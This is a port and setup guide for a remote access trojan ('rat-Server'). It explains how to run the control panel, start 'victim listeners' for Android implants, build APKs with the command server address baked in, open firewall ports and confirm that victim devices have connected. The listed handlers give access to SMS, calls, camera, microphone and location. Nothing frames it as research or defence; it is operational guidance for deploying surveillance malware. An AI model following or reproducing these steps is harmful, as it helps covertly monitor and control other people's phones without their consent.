# Server Port Configuration Guide

## Overview

The rat_custod server uses a **dual-port architecture** with two distinct server components:

1. **Main Server** - UI and API endpoints (default port: 3000)
2. **Dynamic Victim Listeners** - Android client connections (configurable, default: 8000)

This document explains how each port is configured, used, and how to verify the setup.

---

## Port Architecture

### 1. Main Server Port (Default: 3000)

**Purpose**: Serves the web UI, API endpoints, and configuration management

**Port Configuration**:
```javascript
const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Servidor en http://0.0.0.0:${PORT}`)
});
```

**How to Configure**:
- **Default**: Port 3000 (hardcoded fallback)
- **Environment Variable**: Set `PORT` environment variable to override
  ```bash
  PORT=5000 node server.js  # Runs on port 5000
  ```

**What Runs on This Port**:
- Web-based control panel UI (`/`)
- Configuration endpoint (`/api/config`)
- Notifications endpoint (`/api/notifications/:victim`)
- Build endpoint (`/api/build`)
- Victim listener management (`/api/listen`, `/api/stop`)
- WebSocket for UI communication

**Accessibility Requirements**:
- Must be accessible from:
  - Web browsers (for UI access)
  - Android clients (to fetch config from `/api/config`)
  - Build tools (if using the APK builder API)

**Testing the Main Server**:
```bash
# Test if the server is running
curl http://localhost:3000/api/config

# Expected response:
# {"SERVER_IP":"192.168.1.68","SERVER_PORT":8000}

# Test from another machine
curl http://192.168.1.68:3000/api/config
```

---

### 2. Dynamic Victim Listener Ports (e.g., 8000)

**Purpose**: Dedicated Socket.IO servers for Android client connections

**Port Configuration**:
- Ports are created **dynamically** at runtime via the `/api/listen` endpoint
- Default port in `config.json` is 8000 but can be any available port

**How It Works**:

1. **Creating a Listener**:
   ```bash
   # Via the web UI's "Victims Lab" section
   # Or via API:
   curl -X POST http://localhost:3000/api/listen \
     -H "Content-Type: application/json" \
     -d '{"port": 8000}'
   ```

2. **Server Creates Dynamic Listener**:
   ```javascript
   const dynServer = http.createServer();
   const dynIO = socketIO(dynServer, { /* config */ });
   dynServer.listen(port, '0.0.0.0', () => {
     console.log(`🔊 Victims Lab listening on port ${port}`);
   });
   ```

3. **Android Clients Connect**:
   - Clients read `SERVER_PORT` from `/api/config` or AndroidManifest.xml
   - Connect to `http://<SERVER_IP>:<SERVER_PORT>` (e.g., `http://192.168.1.68:8000`)

**What Runs on These Ports**:
- Socket.IO connection handlers for Android agents
- Handlers for commands: SMS, calls, camera, microphone, location, etc.
- Device connection/disconnection events
- Notification forwarding

**Important Notes**:
- ⚠️ **Victim listener must be started manually** via the UI or `/api/listen` API
- ⚠️ Each port can only be used by one listener at a time
- ⚠️ Stopping a listener closes all client connections on that port

**Testing Victim Listeners**:
```bash
# Check if port 8000 is listening
netstat -an | grep 8000
# Or on Linux/macOS:
lsof -i :8000

# Test Socket.IO connection (requires socket.io-client)
# The Android client will establish the actual connection
```

---

## Configuration Files

### config.json

**Location**: `rat-Server/config.json`

**Purpose**: Defines the default IP and port that Android clients should connect to

**Format**:
```json
{
  "SERVER_IP": "192.168.1.68",
  "SERVER_PORT": 8000
}
```

**Fields**:
- `SERVER_IP`: The IP address where the server is accessible to Android clients
  - Use your machine's LAN IP (e.g., `192.168.1.68`)
  - Can be a domain name if configured
  - Do NOT use `localhost` or `127.0.0.1` (clients won't reach it)

- `SERVER_PORT`: The port number where the victim listener runs
  - Default: 8000
  - Must match the port started via `/api/listen`
  - Can be any available port (1024-65535 recommended)

**When to Update**:
- When changing the server's network location
- When moving to a different port
- When deploying to a new environment

**Dynamic Configuration Flow**:
```
1. Server hosts config.json
2. Server exposes /api/config endpoint (on port 3000)
3. Android client fetches http://<SERVER_IP>:3000/api/config
4. Android client connects to http://<SERVER_IP>:<SERVER_PORT>
```

---

## Complete Setup Walkthrough

### Step 1: Configure the Server

1. Edit `config.json` with your server's IP and desired port:
   ```json
   {
     "SERVER_IP": "192.168.1.68",
     "SERVER_PORT": 8000
   }
   ```

2. Determine your server's IP address:
   ```bash
   # On macOS/Linux:
   ifconfig | grep "inet "
   # Or:
   ip addr show | grep "inet "
   
   # On Windows:
   ipconfig
   ```

### Step 2: Start the Main Server

```bash
cd rat-Server
npm install  # First time only
node server.js
```

**Expected Output**:
```
☁️ Using Android SDK at /path/to/android/sdk
🚀 Servidor en http://0.0.0.0:3000
```

### Step 3: Verify Main Server Access

**From the server machine**:
```bash
curl http://localhost:3000/api/config
```

**From the Android device's network**:
```bash
curl http://192.168.1.68:3000/api/config
```

**Expected Response**:
```json
{"SERVER_IP":"192.168.1.68","SERVER_PORT":8000}
```

### Step 4: Start the Victim Listener

**Option A: Via Web UI**:
1. Open http://192.168.1.68:3000 in a browser
2. Navigate to "Victims Lab" section
3. Enter port `8000` and click "Start Listening"

**Option B: Via API**:
```bash
curl -X POST http://localhost:3000/api/listen \
  -H "Content-Type: application/json" \
  -d '{"port": 8000}'
```

**Expected Console Output**:
```
🔊 Victims Lab listening on port 8000
```

### Step 5: Build or Install the Android APK

The APK needs to know about the main server's location to fetch config.

**During Build** (via `/api/build`):
- The server reads `config.json`
- Injects `SERVER_IP` and `SERVER_PORT` into AndroidManifest.xml
- These become fallback values if `/api/config` is unreachable

**At Runtime**:
1. Android app starts `MainService`
2. Reads fallback values from AndroidManifest.xml
3. Fetches dynamic config from `http://<SERVER_IP>:3000/api/config`
4. Connects to `http://<SERVER_IP>:<SERVER_PORT>`

### Step 6: Verify Android Client Connection

**Monitor server console**:
```
[Victim ⬅] Puerto 8000, IP=192.168.10.50, manf=Samsung, model=SM-G960F, release=10
```

**Check web UI**:
- Navigate to "Victims" or "Connected Devices"
- Should see connected device with IP:PORT (e.g., `192.168.10.50:8000`)

---

## Port Verification Commands

### Check if Ports are Listening

**On Linux/macOS**:
```bash
# Check if port 3000 is listening
sudo lsof -i :3000

# Check if port 8000 is listening
sudo lsof -i :8000

# Or using netstat
netstat -an | grep LISTEN | grep -E "3000|8000"
```

**On Windows**:
```powershell
# Check if port 3000 is listening
netstat -ano | findstr :3000

# Check if port 8000 is listening
netstat -ano | findstr :8000
```

### Test Port Accessibility

**From the server machine**:
```bash
# Test main server
curl http://localhost:3000/api/config

# Test victim listener (requires Socket.IO client)
telnet localhost 8000
```

**From another machine on the network**:
```bash
# Test main server
curl http://192.168.1.68:3000/api/config

# Test port reachability
nc -zv 192.168.1.68 3000
nc -zv 192.168.1.68 8000
```

**From Android device** (using Termux or similar):
```bash
curl http://192.168.1.68:3000/api/config
nc -zv 192.168.1.68 8000
```

---

## Firewall Configuration

To allow external devices (Android clients) to connect, ensure firewall rules permit incoming connections:

### Linux (ufw)
```bash
sudo ufw allow 3000/tcp
sudo ufw allow 8000/tcp
sudo ufw status
```

### Linux (firewalld)
```bash
sudo firewall-cmd --permanent --add-port=3000/tcp
sudo firewall-cmd --permanent --add-port=8000/tcp
sudo firewall-cmd --reload
```

### macOS
```bash
# Allow through Application Firewall
# System Preferences → Security & Privacy → Firewall → Firewall Options
# Add Node.js and allow incoming connections
```

### Windows
```powershell
# Add inbound rules
netsh advfirewall firewall add rule name="RAT Server Main" dir=in action=allow protocol=TCP localport=3000
netsh advfirewall firewall add rule name="RAT Server Victims" dir=in action=allow protocol=TCP localport=8000
```

---

## Environment Variables

### PORT (Main Server Port)

**Default**: 3000

**Usage**:
```bash
# Temporary
PORT=5000 node server.js

# Permanent (add to ~/.bashrc or ~/.zshrc)
export PORT=5000
node server.js
```

**In systemd service**:
```ini
[Service]
Environment="PORT=5000"
ExecStart=/usr/bin/node /path/to/rat-Server/server.js
```

**In Docker**:
```bash
docker run -e PORT=5000 -p 5000:5000 rat-server
```

---

## Troubleshooting

### Issue: Android client can't fetch config

**Symptoms**:
- Client logs: "Failed to fetch config" or "Using fallback values"
- Connection works with manifest values but not with dynamic config

**Diagnosis**:
```bash
# From Android device's network, test the endpoint
curl http://192.168.1.68:3000/api/config
```

**Solutions**:
1. Verify main server is running on port 3000
2. Check `SERVER_IP` in config.json matches server's actual IP
3. Ensure firewall allows port 3000
4. Verify Android device is on the same network (or routes exist)
5. Check server logs for errors

---

### Issue: Android client can't connect to victim listener

**Symptoms**:
- Config fetches successfully
- Client logs: "Connection timeout" or "Connection refused"
- No connection events in server logs

**Diagnosis**:
```bash
# Check if victim listener is running
curl -X POST http://localhost:3000/api/listen \
  -H "Content-Type: application/json" \
  -d '{"port": 8000}'

# Verify port is listening
lsof -i :8000
```

**Solutions**:
1. Start the victim listener via UI or `/api/listen` API
2. Verify `SERVER_PORT` in config.json matches the started listener port
3. Check firewall allows the victim listener port
4. Ensure no other service is using the port
5. Verify network connectivity: `nc -zv <SERVER_IP> 8000`

---

### Issue: Port already in use

**Error**: `Error: listen EADDRINUSE: address already in use :::3000`

**Diagnosis**:
```bash
# Find what's using the port
lsof -i :3000
# Or:
netstat -anp | grep :3000
```

**Solutions**:
1. Stop the conflicting service
2. Use a different port: `PORT=3001 node server.js`
3. Kill the process: `kill -9 <PID>`

---

### Issue: Can't access from other devices

**Symptoms**:
- Server works on localhost but not from network
- `curl http://192.168.1.68:3000/api/config` fails from other devices

**Diagnosis**:
```bash
# Verify server is binding to all interfaces (0.0.0.0)
netstat -an | grep 3000
# Should show: 0.0.0.0:3000 or :::3000 (not 127.0.0.1:3000)
```

**Solutions**:
1. Verify server binds to `0.0.0.0` (already configured in server.js)
2. Check firewall settings
3. Verify network connectivity
4. Ensure router allows inter-device communication (disable AP isolation if on WiFi)

---

## Port Summary Table

| Port | Purpose | Configurable Via | Default | Binds To | Required For |
|------|---------|-----------------|---------|----------|--------------|
| 3000 | Main Server (UI, API, Config) | `PORT` env variable | 3000 | 0.0.0.0 | Web UI access, Config endpoint, Build API |
| 8000* | Victim Listener (Android Clients) | config.json + `/api/listen` | 8000 | 0.0.0.0 | Android client connections |

*Multiple victim listeners can run on different ports simultaneously

---

## Best Practices

1. **Use consistent port numbers**:
   - Keep `SERVER_PORT` in config.json aligned with your started victim listener
   - Document any non-default ports used

2. **Firewall configuration**:
   - Only open necessary ports
   - Consider restricting access by IP range if possible

3. **Network accessibility**:
   - Use LAN IP addresses (192.168.x.x, 10.x.x.x) for local network
   - For remote access, use public IP or domain with proper port forwarding

4. **Testing workflow**:
   - Always test `/api/config` endpoint before distributing APK
   - Verify victim listener is started before expecting client connections
   - Test from the actual network where Android devices will connect

5. **Documentation**:
   - Keep track of which ports are being used
   - Document any custom port configurations in your deployment notes

---

## Quick Reference

### Starting the Server
```bash
cd rat-Server
node server.js
```

### Starting a Victim Listener
```bash
curl -X POST http://localhost:3000/api/listen \
  -H "Content-Type: application/json" \
  -d '{"port": 8000}'
```

### Stopping a Victim Listener
```bash
curl -X POST http://localhost:3000/api/stop \
  -H "Content-Type: application/json" \
  -d '{"port": 8000}'
```

### Testing Configuration Endpoint
```bash
curl http://localhost:3000/api/config
curl http://192.168.1.68:3000/api/config
```

### Checking Port Status
```bash
# Linux/macOS
lsof -i :3000
lsof -i :8000

# All platforms
netstat -an | grep LISTEN | grep -E "3000|8000"
```

---

## Related Documentation

- [README.md](README.md) - General project overview and setup
- [DYNAMIC_CONFIG.md](DYNAMIC_CONFIG.md) - Dynamic configuration system details
- [BUILD_SETUP.md](BUILD_SETUP.md) - APK building instructions
